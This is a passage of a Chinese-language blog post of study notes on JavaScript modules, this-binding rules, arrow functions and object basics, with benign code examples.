&#123;</span><br><span class="line">        <span class="attr">awesome</span>:awesome</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar=MyModules.get(<span class="string">&#x27;bar&#x27;</span>);<span class="comment">//通过管理器获取模块&#x27;bar&#x27;</span></span><br><span class="line"><span class="keyword">var</span> foo=MyModules.get(<span class="string">&#x27;foo&#x27;</span>);<span class="comment">//通过管理器获取模块&#x27;foo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(</span><br><span class="line"><span class="comment">//调用模块bar的hello接口</span></span><br><span class="line">         bar.hello( <span class="string">&quot;hippo&quot;</span> ) </span><br><span class="line">); <span class="comment">// Let me introduce: hippo </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//调用模块foo的awesome接口</span></span><br><span class="line">foo.awesome(); <span class="comment">// LET ME INTRODUCE: HIPPO</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这节的主要内容还是了解现在是如何对模块进行一个规范处理。主要是两部分内容，一个是通过名称和依赖合理定义模块并储存；另一个则是通过名称对存储的模块的调用。</p><h4 id="5-5-2-未来的模块机制"><a href="#5-5-2-未来的模块机制" class="headerlink" title="5.5.2 未来的模块机制"></a><strong>5.5.2 未来的模块机制</strong></h4><p>这节说的模块就是我常说的模块化开发，并且主要提到的就是ES6里常用的import。</p><h3 id="5-6-小结"><a href="#5-6-小结" class="headerlink" title="5.6 小结"></a>5.6 小结</h3><p>闭包:当函数可以记住并访问所在的词法作用域，并且函数是在当前词法作用域之外执行，这时就产生了闭包。</p><p>模块有两个主要特征:</p><ul><li>为创建内部作用域而调用了一个包装函数(模块构造器的实例化);</li><li>包装函数的返回值(也就是模块)必须至少包括一个对内部函数的引用，这样就会创建涵盖整个包装函数内部作用域的闭包。</li></ul><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><h2 id="第一章-关于this"><a href="#第一章-关于this" class="headerlink" title="第一章 关于this"></a>第一章 关于this</h2><h3 id="1-1-为什么要用this"><a href="#1-1-为什么要用this" class="headerlink" title="1.1 为什么要用this"></a>1.1 为什么要用this</h3><p>因为this 提供了一种更优雅的方式来隐式“传递”一个对象(即上下文对象)引用，因此可以将 API 设计得更加简洁并且易于复用。</p><h3 id="1-2-误解"><a href="#1-2-误解" class="headerlink" title="1.2 误解"></a>1.2 误解</h3><p>下面两种常见的对于 this 的解释都是错误的(看看就好，就不过多解读了，以免增加了对错误的印象)。</p><h4 id="1-2-1-指向自身"><a href="#1-2-1-指向自身" class="headerlink" title="1.2.1 指向自身"></a>1.2.1 指向自身</h4><p>人们很容易把 this 理解成指向函数自身.    </p><p>具名函数，可以在它内部可以使用函数名来引用自身进行递归，添加属性等。例如:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  foo.count = <span class="number">4</span>; <span class="comment">// foo 指向它自身</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匿名函数如果想要调用自身则，需要使用<code>arguments.callee</code>不过这个属性在ES5严格模式下已经禁止了，也不建议使用。</p><h4 id="1-2-2-它的作用域"><a href="#1-2-2-它的作用域" class="headerlink" title="1.2.2 它的作用域"></a>1.2.2 它的作用域</h4><p><strong>切记:</strong> <strong>this 在任何情况下都不指向函数的词法作用域。你不能使用 this 来引用一个词法作用域内部的东西。</strong>这部分只需记住这一段话就行.</p><p><strong>终极疑问:</strong> JavaScript里的作用域到底是对象吗？<br>在JavaScript里，作用域其实是一个比较特殊的对象，作用域里所有可见的标识符都是它的属性。只是作用域对象并不能通过JavaScript代码被我们访问，它只存在于JavaScript引擎内部。</p><h3 id="1-3-this到底是什么"><a href="#1-3-this到底是什么" class="headerlink" title="1.3 this到底是什么"></a>1.3 this到底是什么</h3><p>this 是在运行时进行绑定的，<strong>并不是在编写时绑定</strong>，它的上下文(对象)取决于函数调用时的各种条件。this 的绑定和函数声明的位置没有任何关系，<strong>只取决于函数的调用方式</strong>。</p><p>当一个函数被调用时，会创建一个活动记录(有时候也称为执行上下文)。这个记录会包含函数在哪里被调用(调用栈)、函数的调用方法、传入的参数等信息。<strong>this 就是记录的其中一个属性</strong>，会在函数执行的过程中用到。(所以this并不等价于执行上下文)</p><h3 id="1-4-小结"><a href="#1-4-小结" class="headerlink" title="1.4 小结"></a>1.4 小结</h3><ul><li>学习 this 的第一步是明白 this 既不指向函数自身也不指向函数的词法作用域。</li><li>this 实际上是在函数被调用时发生的绑定，<strong>它指向什么完全取决于函数在哪里被调用</strong>。</li></ul><h2 id="第二章-this全面解析"><a href="#第二章-this全面解析" class="headerlink" title="第二章 this全面解析"></a>第二章 this全面解析</h2><h3 id="2-1-调用位置"><a href="#2-1-调用位置" class="headerlink" title="2.1 调用位置"></a>2.1 调用位置</h3><p>调用位置就是函数在代码中被调用的位置(<strong>而不是声明的位置</strong>)。寻找调用位置最重要的是要分析<strong>调用栈</strong>。我们关心的调用位置就在当前正在执行的函数的前一个调用中。</p><p>下面我们来看看到底什么是调用栈和调用位置：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 当前调用栈是：baz</span></span><br><span class="line"><span class="comment">// 因此，当前调用位置是全局作用域</span></span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">&quot;baz&quot;</span> );</span><br><span class="line">bar(); <span class="comment">// &lt;-- bar 的调用位置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 当前调用栈是 baz -&gt; bar</span></span><br><span class="line"><span class="comment">// 因此，当前调用位置在 baz 中</span></span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">&quot;bar&quot;</span> );</span><br><span class="line">foo(); <span class="comment">// &lt;-- foo 的调用位置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 当前调用栈是 baz -&gt; bar -&gt; foo</span></span><br><span class="line"><span class="comment">// 因此，当前调用位置在 bar 中</span></span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">&quot;foo&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line">baz(); <span class="comment">// &lt;-- baz 的调用位置</span></span><br></pre></td></tr></table></figure><h3 id="2-2-绑定规则"><a href="#2-2-绑定规则" class="headerlink" title="2.2 绑定规则"></a>2.2 绑定规则</h3><p>在找到调用位置后，需要判定代码属于下面四种绑定规则中的哪一种，然后才能对this进行绑定。<br><strong>注意:</strong> this绑定的是上下文<strong>对象</strong>，<strong>并不是函数自身也不是函数的词法作用域</strong></p><h4 id="2-2-1-默认绑定"><a href="#2-2-1-默认绑定" class="headerlink" title="2.2.1 默认绑定"></a>2.2.1 <strong>默认绑定</strong></h4><p><strong>独立函数调用</strong>:对函数直接使用而不带任何修饰的函数引用进行调用。简单点，一个函数直接是<code>func()</code>这样调用，<strong>前面什么都没有</strong>。不同于通过对象属性调用例如<code>obj.func()</code>，也没有通过new关键字<code>new Function()</code>;也没有通过apply，bind，call强制改变this指向。<br><strong>默认绑定:</strong> 当被用作独立函数调用时（不论这个函数在哪被调用，不管全局还是其他函数内），this默认指向到window；<br><strong>注意:</strong> 如果使用严格模式(strict mode)，那么全局对象将无法使用默认绑定，因此 this 会绑定到 undefined.</p><h4 id="2-2-2-隐式绑定"><a href="#2-2-2-隐式绑定" class="headerlink" title="2.2.2 隐式绑定"></a>2.2.2 <strong>隐式绑定</strong></h4><p><strong>隐式绑定:</strong> 函数被某个对象拥有或者包含，也就是函数被作为对象的属性所引用。例如<code>obj.func()</code>，此时this会绑定到该对象上。<br><strong>隐式丢失:</strong> 不管是通过函数别名或是将函数作为入参造成的隐式丢失。只需找到它真正的调用位置，并且函数前没有任何修饰也没有显式绑定(非严格模式下)，那么this则会进行默认绑定，指向window。    </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="built_in">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line"><span class="attr">a</span>: <span class="number">2</span>,</span><br><span class="line"><span class="attr">foo</span>: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> bar = obj.foo; <span class="comment">// 函数别名！</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;oops, global&quot;</span>; <span class="comment">// a 是全局对象的属性</span></span><br><span class="line">bar(); <span class="comment">// &quot;oops, global&quot;</span></span><br></pre></td></tr></table></figure><p>虽然 bar 是 obj.foo 的一个引用，但是实际上，它引用的是 foo 函数本身，因此此时的 bar() 其实是一个不带任何修饰的函数调用，因此应用了默认绑定。</p><p>传入回调函数时:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="built_in">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doFoo</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line"><span class="comment">// fn 其实引用的是 foo</span></span><br><span class="line">fn(); <span class="comment">// &lt;-- 调用位置！</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line"><span class="attr">a</span>: <span class="number">2</span>,</span><br><span class="line"><span class="attr">foo</span>: foo</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;oops, global&quot;</span>; <span class="comment">// a 是全局对象的属性</span></span><br><span class="line">doFoo( obj.foo ); <span class="comment">// &quot;oops, global&quot;</span></span><br></pre></td></tr></table></figure><p>参数传递其实就是一种隐式赋值，因此我们传入函数时也会被隐式赋值。</p><p><strong>注意:</strong> 实际工作中，大部分this使用错误都是由对隐式丢失的不理解造成的。<strong>记住函数调用前没有任何修饰和显式绑定(其实就是call、apply、bind)，this就指向window</strong>。</p><h4 id="2-2-3-显式绑定"><a href="#2-2-3-显式绑定" class="headerlink" title="2.2.3 显式绑定"></a>2.2.3 <strong>显式绑定</strong></h4><p>在分析隐式绑定时，我们必须在一个对象内部包含一个指向函数的属性，并通过这个属性间接引用函数，从而把 this 间接(隐式)绑定到这个对象上。如果我们不想在对象内部包含函数引用，而想在某个对象上强制调用函数，此时则需要显式绑定。     </p><p><strong>显式绑定:</strong>  可以直接指定 this 的绑定对象，被称之为显式绑定。基本上就是我们常使用的call、apply、bind方法都是显式绑定。 </p><p>**注意:**如果你传入了一个原始值(字符串类型、布尔类型或者数字类型)来当作 this 的绑定对 象，这个原始值会被转换成它的对象形式(也就是new String(..)、new Boolean(..)或者 new Number(..))。这通常被称为“装箱”。</p><p><strong>硬绑定:</strong> 使用 call、apply、bind 方法强制显式地将 this 进行绑定，称之为硬绑定。硬绑定的典型应用场景就是创建一个包裹函数(其实就是常说的封装函数)，传入所有的参数并返回接收到的所有值。</p><p>在封装函数中，我们常使用apply：</p><ul><li>一方面是因为它可以手动绑定this，更重要的是因为可以用apply的第二个参数，方便地注入所有传入的参数。例如之前提到的<code>modules[name]=impl.apply(impl，deps)</code>.因为我们不知道传入的参数有多少个，但我们可以方便地使用一个<code>deps</code>将其全部注入。</li><li>另一个常用的是<code>foo.apply( null，argue)</code>当我们将apply的第一个参数设置为null时，此时this就会默认绑定到window。切记使用这种用法时<strong>确保函数foo内没有使用this，</strong> 否则很可能会造成全局污染。</li><li>还有一种常用就是<code>foo.call(this)</code>。这样foo里的this都会指向当前调用的上下文环境.</li></ul><p><strong>API调用的“上下文”:</strong> 第三方库的许多函数，以及 JavaScript 语言和宿主环境中许多新的内置函数，都提供了一个可选的参数，通常被称为“上下文”(context)，其作用和 bind(..) 一样，确保你的回调函数使用指定的 this。</p><h4 id="2-2-4-new绑定"><a href="#2-2-4-new绑定" class="headerlink" title="2.2.4 new绑定"></a><strong>2.2.4 new绑定</strong></h4><p>在 JavaScript 中，构造函数只是一些使用 new 操作符时被调用的函数，它们并不会属于某个类，也不会实例化一个类。实际上， 它们甚至都不能说是一种特殊的函数类型，<strong>它们只是被 new 操作符调用的普通函数而已。实际上并不存在所谓的“构造函数”，只有对于函数的“构造调用”。</strong></p><p>使用 new 来调用函数，或者说发生构造函数调用时，会自动执行下面的操作：</p><ol><li>创建一个全新的对象。</li><li>这个新对象会被执行[[原型]]连接。</li><li>这个新对象会绑定到函数调用的this。</li><li>如果函数没有返回其他对象，那么new表达式中的函数调用会自动返回这个新对象。</li></ol><p>示例:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">this</span>.a = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> foo(<span class="number">2</span>); </span><br><span class="line"><span class="built_in">console</span>.log( bar.a ); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>使用 new 来调用 foo(..) 时，我们会构造一个新对象并把它绑定到 foo(..) 调用中的 this 上。<br><strong>说明:对于上面这句话进行解释下，如果在一个函数前面带上 new 关键字来调用， 那么背地里将会创建一个连接到该函数的 prototype 的新对象，this就指向这个新对象。</strong></p><h3 id="2-3-优先级"><a href="#2-3-优先级" class="headerlink" title="2.3 优先级"></a>2.3 优先级</h3><p>结论:     new绑定=显示绑定&gt;隐式绑定&gt;默认绑定     </p><p><strong>说明:</strong> new绑定与显示绑定是不能直接进行测试比较，但通过分析发现new绑定内部其实是使用了硬绑定(显示绑定的一种)，所以new绑定和显示绑定优先级应该差不多。</p><p><strong>判断this:</strong>     现在我们可以根据优先级来判断函数在某个调用位置应用的是哪条规则。按下面的顺序进行判断:</p><ol><li>函数是否在new中调用(new绑定)？如果是的话this绑定的是新创建的对象。  var bar = new foo()</li><li>函数是否通过call、apply(显式绑定)或者硬绑定调用？如果是的话，this绑定的是指定的对象。var bar = foo.call(obj2)</li><li>函数是否在某个上下文对象中调用(隐式绑定)？如果是的话，this 绑定的是那个上下文对象。var bar = obj1.foo()</li><li>如果都不是的话，使用默认绑定。如果在严格模式下，就绑定到undefined，否则绑定到全局对象。var bar = foo()</li></ol><h3 id="2-4-绑定例外"><a href="#2-4-绑定例外" class="headerlink" title="2.4 绑定例外"></a>2.4 绑定例外</h3><h4 id="2-4-1-被忽略的this"><a href="#2-4-1-被忽略的this" class="headerlink" title="2.4.1 被忽略的this"></a><strong>2.4.1 被忽略的this</strong></h4><p>如果你把 null 或者 undefined 作为 this 的绑定对象传入 call、apply 或者 bind，这些值在调用时会被忽略，实际应用的是默认绑定规则，this会绑定到window上。     </p><p><strong>使用情景:</strong>  使用 apply(..) 来“展开”一个数组(也可以用来方便地参数注入)，并当作参数传入一个函数。类似地，bind(..) 可以对参数进行柯里化(预先设置一些参数)，通过自带bind方法实现柯里化是很方便的。</p><p><strong>注意:</strong> </p><ul><li>在 ES6 中，可以用 … 操作符代替 apply(..) 来“展 开”数组，foo(…[1，2]) 和 foo(1，2)是一样的，这样可以避免不必要的 this 绑定。</li><li>当使用null或者undefined进行绑定时，要<strong>确保该函数内没有使用this</strong>，否则此时很容易对全局变量造成破坏！</li></ul><p><strong>更安全的this：</strong>如果函数内使用了this，直接使用null则可能会对全局造成破坏，因此我们可以通过创建一个“DMZ”(demilitarized zone，非军事区)对象——它就是一个空的非委托的对象(委托在第 5 章和第 6 章介绍)。让this绑定到这个”DMZ上，这样就不会对全局造成破坏。</p><p>怎么创建DMZ呢？就是通过<strong>Object.create(null)</strong> 创建一个空对象。这种方法和 {} 很像，但是并不会创建 Object.prototype 这个委托，所以它比 {}“更空”更加安全。 （感觉用不上）</p><h4 id="2-4-2-间接引用"><a href="#2-4-2-间接引用" class="headerlink" title="2.4.2 间接引用"></a><strong>2.4.2 间接引用</strong></h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( <span class="built_in">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> o = &#123; <span class="attr">a</span>: <span class="number">3</span>， foo: foo &#125;; </span><br><span class="line"><span class="keyword">var</span> p = &#123; <span class="attr">a</span>: <span class="number">4</span> &#125;;</span><br><span class="line">o.foo(); <span class="comment">// 3</span></span><br><span class="line">(p.foo = o.foo)(); <span class="comment">// 2  其实就是foo()  此时this默认绑定到window</span></span><br></pre></td></tr></table></figure><p>例子中的间接引用其实是对函数的理解不深造成的。其实(p.foo = o.foo)()就是(foo)()，这样就是全局调用foo()，所以this默认就绑定到了window上。    </p><p><strong>注意:</strong>    对于默认绑定来说，决定 this 绑定对象的并不是调用位置是否处于严格模式，而是函数体是否处于严格模式。如果函数体处于严格模式，this 会被绑定到 undefined，否则 this 会被绑定到全局对象。</p><h4 id="2-4-3-软绑定"><a href="#2-4-3-软绑定" class="headerlink" title="2.4.3 软绑定"></a><strong>2.4.3 软绑定</strong></h4><p>硬绑定会大大降低函数的灵活性，使用硬绑定之后就无法使用隐式绑定或者显式绑定来修改 this。这时候则需要使用软绑定。    （PS：有时间好好学一下）</p><h3 id="2-5-this词法"><a href="#2-5-this词法" class="headerlink" title="2.5 this词法"></a>2.5 this词法</h3><p> ES6 中介绍了一种无法使用上面四条规则的特殊函数类型:箭头函数。<strong>箭头函数不使用 this 的四种标准规则，而是根据外层(函数或者全局)作用域来决定 this。</strong></p><p> <strong>重要:</strong></p><ul><li>箭头函数最常用于回调函数中，例如事件处理器或者定时器.</li><li>箭头函数可以像 bind(..) 一样确保函数的 this 被绑定到指定对象</li><li>箭头函数用更常见的词法作用域取代了传统的 this 机制。</li></ul><p><strong>注意</strong>这种情况:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">module</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="number">99</span>，</span><br><span class="line">  <span class="attr">bar</span>: <span class="built_in">module</span>.bind(<span class="built_in">this</span>) <span class="comment">//此时bind绑定的this为window.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;window&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar()) <span class="comment">//window</span></span><br></pre></td></tr></table></figure><p>在 ES6 之前我们就已经在使用一种几乎和箭头函数完全一样的模式:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> self = <span class="built_in">this</span>; </span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log( self.a );</span><br><span class="line">    &#125;， <span class="number">100</span> );</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; </span><br><span class="line">    <span class="attr">a</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line">foo.call( obj ); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>虽然 self = this 和箭头函数看起来都可以取代 bind(..)，但是从本质上来说，它们想替代的是 this 机制。</p><p><strong>关于this的编码规范建议:</strong></p><ul><li>只使用词法作用域并完全抛弃错误this风格的代码。</li><li>完全采用 this 风格，在必要时使用 bind(..)，尽量避免使用 self = this 和箭头函数。</li></ul><h3 id="2-6-小结"><a href="#2-6-小结" class="headerlink" title="2.6 小结"></a>2.6 小结</h3><p>如果要判断一个运行中函数的 this 绑定，就需要找到这个函数的直接调用位置。找到之后就可以顺序应用下面这四条规则来判断 this 的绑定对象。</p><ol><li><p>由new调用？绑定到新创建的对象。</p></li><li><p>由call或者apply(或者bind)调用？绑定到指定的对象。</p></li><li><p>由上下文对象调用？绑定到那个上下文对象。</p></li><li><p>默认:在严格模式下绑定到undefined，否则绑定到全局对象。</p></li></ol><p>一定要注意，有些调用可能在无意中使用默认绑定规则。如果想“更安全”地忽略 this 绑定，你可以使用一个 DMZ 对象，比如 ø = Object.create(null)，以保护全局对象。    </p><p>ES6 中的箭头函数并不会使用四条标准的绑定规则，而是根据当前的词法作用域来决定 this，具体来说，箭头函数会继承外层函数调用的 this 绑定(无论 this 绑定到什么)。这其实和 ES6 之前代码中的 self = this 机制一样。     </p><p><strong>特别注意:</strong> 其中最需要注意的就是<strong>当你使用jquery或vue时</strong>，此时this是被动态绑定了的。使用 Vue.js时，方法和计算函数通常将 this 设置为 Vue 组件实例。vue文档中<code>所有的生命周期钩子自动绑定 this 上下文到实例中，因此你可以访问数据，对属性和方法进行运算。这意味着你不能使用箭头函数来定义一个生命周期方法 (例如 created: () =&gt; this.fetchTodos())。这是因为箭头函数绑定了父上下文，因此 this 与你期待的 Vue 实例不同，this.fetchTodos 的行为未定义。</code><br><strong>上下文(对象)与函数作用域的区别与联系:</strong></p><ul><li><strong>上下文：</strong> 可以理解为一个对象，所有的变量都储存在里面。上下文环境是在函数被调用并被引擎执行时创建的。如果你没调用，那么就没有上下文。</li><li><strong>作用域：</strong> 除了全局作用域，只有函数和ES6新增的let，const才能创建作用域。创建一个函数就创建了一个作用域，无论你调用不调用，函数只要创建了，它就有独立的作用域。作用域控制着被调用函数中的变量访问。</li><li><strong>两者:</strong> 作用域是基于函数的，而上下文是基于对象的。作用域涉及到所被调用函数中的变量访问，并且不同的调用场景是不一样的。上下文始终是this关键字有关， 它控制着this的引用。一个作用域下可能包含多个上下文。有可能从来没有过上下文（函数没有被调用）；有可能有过，现在函数被调用完毕后，上下文环境被销毁了(垃圾回收)；有可能同时存在一个或多个（闭包）。</li></ul><h2 id="第三章-对象"><a href="#第三章-对象" class="headerlink" title="第三章 对象"></a>第三章 对象</h2><h3 id="3-1-语法"><a href="#3-1-语法" class="headerlink" title="3.1 语法"></a>3.1 语法</h3><p>对象可以通过两种形式定义:声明(文字)形式(就是常说的对象字面量)和构造形式。</p><ul><li>声明形式(对象字面量):</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> myObj = &#123; </span><br><span class="line">   <span class="attr">key</span>: value</span><br><span class="line">   <span class="comment">// ... </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>构造形式:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObj = <span class="keyword">new</span> <span class="built_in">Object</span>(); </span><br><span class="line">myObj.key = value;</span><br></pre></td></tr></table></figure><p>构造形式和文字形式生成的对象是一样的。唯一的区别是，在文字声明中你可以添加多个 键 / 值对，但是在构造形式中你必须逐个添加属性。</p><h3 id="3-2-类型"><a href="#3-2-类型" class="headerlink" title="3.2 类型"></a>3.2 类型</h3><p>在JavaScript中一共有6中主要类型(术语是”语言类型”)</p><ul><li>string</li><li>number</li><li>boolean  </li><li>null </li><li>undefined  </li><li>object</li></ul><p><strong>简单数据类型:</strong><br>其中string、boolean、number、null 和 undefined属于简单基本类型，并不属于对象。null 有时会被当作一种对象类型，但是这其实只是语言本身的一个 bug，即对 null 执行typeof null 时会返回字符串 “object”。实际上，null 本身是基本类型。     </p><p><strong>PS:</strong> 原因是这样的，不同的对象在底层都表示为二进制，在 JavaScript 中二进制前三位都为 0 的话会被判断为 object 类型，null 的二进制表示是全 0，自然前三位也是 0，所以执行 typeof 时会返回“object”。</p><p><strong>对象:</strong><br>对象除了我们自己手动创建的，JavaScript其实内置了很多对象，也可以说是对象的一个子类型.     </p><p><strong>内置对象:</strong>    </p><ul><li>String </li><li>Number </li><li>Boolean  </li><li>Object </li><li>Function  </li><li>Array </li><li>Date </li><li>RegExp  </li><li>Error</li></ul><p>在 JavaScript 中，这些内置对象实际上只是一些内置函数。这些内置函数可以当作构造函数来使用。</p><p><strong>几点说明:</strong></p><ul><li>函数就是对象的一个子类型，JavaScript 中的函数是“一等公民”，因为它们本质上和普通的对象一样(只是可以调用)，所以可以像操作其他对象一样操作函数(比如当作另一个函数的参数)。</li><li>通过字面量形式创建字符串，数字，布尔时，引擎会自动把字面量转换成 String 对象，Number对象，Boolean对象，所以它们是可以访对应对象内置的问属性和方法。</li><li>null 和 undefined 没有对应的构造形式，它们只有文字形式。相反，Date 只有构造，没有文字形式。</li><li>对于 Object、Array、Function 和 RegExp来说，无论使用文字形式还是构造形式，它们都是对象，不是字面量。</li><li>Error 对象很少在代码中显式创建，一般是在抛出异常时被自动创建。也可以使用 new Error(..) 这种构造形式来创建。</li></ul><h3 id="3-3-内容"><a href="#3-3-内容" class="headerlink" title="3.3 内容"></a>3.3 内容</h3><p>对象属性:由一些存储在特定命名位置的(任意类型的)值。<br>属性名:存储在对象容器内部的属性的名称。属性值并不会存在对象内，而是通过属性名来指向这些值真正的存储位置。</p><p><strong>属性名的两种形式:</strong></p><ol><li><p>使用<code>.</code>操作符。通常被称为”属性访问”。 <code>.</code> 操作符会要求属性名满足标识符的命名规范。</p></li><li><p>使用<code>[&quot;..&quot;] </code>语法进行访问。这个通常被称为”键访问”。<code>[&quot;..&quot;] </code>语法可以接受任意UTF-8/Unicode 字符串作为属性名。并且<code>[&quot;..&quot;]</code>语法使用字符串来访问属性，如果你的属性名是一个变量，则可以使用书中的例子<code>myObject[idx]</code>形式进行访问。但<strong>如果idx是属性名则还是需写成<code>myObject[&quot;idx&quot;]</code>字符串形式。</strong></p></li></ol><p><strong>注意:</strong> <strong>在对象中，属性名永远都是字符串</strong>。如果你使用 string(字面量)以外的其他值作为属性名，那它首先会被转换为一个字符串，即使是数字也不例外。</p><p><strong>补充:</strong> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123; </span><br><span class="line">  <span class="attr">a</span>:<span class="number">2</span>，</span><br><span class="line">  <span class="attr">idx</span>:<span class="number">111</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> idx=<span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log( myObject[idx] ); <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log( myObject[<span class="string">&quot;idx&quot;</span>] ); <span class="comment">//111</span></span><br><span class="line"><span class="built_in">console</span>.log( myObject[<span class="built_in">this</span>.idx] );  <span class="comment">// 2 此时this是指向window.[]里的this同样符合上一章所讲的规则</span></span><br></pre></td></tr></table></figure><h4 id="3-3-1-可计算属性名"><a href="#3-3-1-可计算属性名" class="headerlink" title="3.3.1 可计算属性名"></a>3.3.1 <strong>可计算属性名</strong></h4><p>ES6 增加了可计算属性名，可以在文字形式中使用 [] 包裹一个表达式来当作属性名:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> prefix = <span class="string">&quot;foo&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">   [prefix + <span class="string">&quot;bar&quot;</span>]:<span class="string">&quot;hello&quot;</span>， </span><br><span class="line">   [prefix + <span class="string">&quot;baz&quot;</span>]: <span class="string">&quot;world&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">myObject[<span class="string">&quot;foobar&quot;</span>]; <span class="comment">// hello</span></span><br><span class="line">myObject[<span class="string">&quot;foobaz&quot;</span>]; <span class="comment">// world</span></span><br></pre></td></tr></table></figure><h4 id="3-3-2-属性与方法"><a href="#3-3-2-属性与方法" class="headerlink" title="3.3.2 属性与方法"></a>3.3.2 <strong>属性与方法</strong></h4><ul><li>我们经常把对象内部引用的函数称为“方法”。</li><li>实际上函数并不属于该对象，它不过是对函数的引用罢了。对象属性访问返回的函数和其他函数没有任何区别(除了可能发生的隐式绑定this到该对象)。</li><li>即使你在对象的文字形式中声明一个函数表达式，这个函数也不会“属于”这个对象—— 它们只是对于相同函数对象的多个引用。</li></ul><h4 id="3-3-3-数组"><a href="#3-3-3-数组" class="headerlink" title="3.3.3 数组"></a>3.3.3 <strong>数组</strong></h4><p>数组支持<code>[]</code>形式访问储存的值，其中<code>[]</code>内的值默认形式为数值下标；数组也是对象，所以虽然每个下标都是整数，你仍然可以给数组添加属性。例如<code>myArray.baz = &quot;baz&quot;</code>。<strong>注意</strong>：添加新属性后，虽然可以访问，但数组的 length 值不会改变。</p><p>数组可以通过<code>myArray[1]=11;myArray[&quot;2&quot;]=22;</code>这种形式对数组内容进行修改，添加。</p><p>虽然数组也可以和对象一样通过<code>键/值 对</code> 形式来使用，但JS已经对数组的行为和用途进行了优化。所以还是建议使用默认的<code>下标/值 对</code> 形式来使用。</p><h4 id="3-3-4-复制对象"><a href="#3-3-4-复制对象" class="headerlink" title="3.3.4 复制对象"></a>3.3.4 